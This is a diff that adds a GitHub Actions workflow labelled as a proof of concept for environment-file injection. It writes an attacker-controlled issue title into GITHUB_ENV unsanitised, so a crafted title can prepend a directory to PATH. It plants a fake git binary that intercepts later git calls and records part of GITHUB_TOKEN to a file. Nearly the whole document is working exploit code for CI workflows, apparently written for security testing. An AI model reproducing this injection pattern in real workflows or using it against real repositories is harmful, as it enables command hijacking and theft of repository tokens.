@@ -1,0 +1,53 @@
+name: GITHUB_PATH injection PoC
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  issues: write
+  contents: read
+
+jobs:
+  path-test:
+    runs-on: ubuntu-latest
+    if: contains(github.event.issue.title, 'path-inject-poc')
+    steps:
+      - name: Simulate PATH prepend from untrusted input
+        run: |
+          # Create a fake git binary
+          mkdir -p /tmp/evil-bin
+          cat > /tmp/evil-bin/git << 'BINEOF'
+          #!/bin/bash
+          echo "SHADOW_GIT_EXECUTED=true" >> /tmp/shadow-proof.txt
+          echo "SHADOW: git command intercepted! Args: $@" >> /tmp/shadow-proof.txt
+          echo "SHADOW: GITHUB_TOKEN=${GITHUB_TOKEN:0:10}..." >> /tmp/shadow-proof.txt
+          /usr/bin/git "$@"
+          BINEOF
+          chmod +x /tmp/evil-bin/git
+          
+          # Process issue title - NOTE: GITHUB_PATH uses one-path-per-line, not KEY=VALUE
+          # So we write the title to GITHUB_ENV (which sets env vars including PATH)
+          # The attack: inject PATH=/tmp/evil-bin:$PATH via GITHUB_ENV newline
+          echo "ISSUE_TAG=${{ github.event.issue.title }}" >> $GITHUB_ENV
+          echo "Processed issue"
+          
+      - name: Victim step uses git (PATH should be modified)
+        run: |
+          echo "=== PATH check ==="
+          echo "PATH=$PATH"
+          echo ""
+          echo "=== which git ==="
+          which git
+          echo ""
+          # Run git - if PATH was injected, our shadow git runs first
+          git --version
+          echo ""
+          echo "=== Shadow proof ==="
+          if [ -f /tmp/shadow-proof.txt ]; then
+            cat /tmp/shadow-proof.txt
+            echo "CRITICAL: Shadow git was executed!"
+          else
+            echo "Shadow git was NOT executed (PATH injection may not have worked)"
+          fi
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
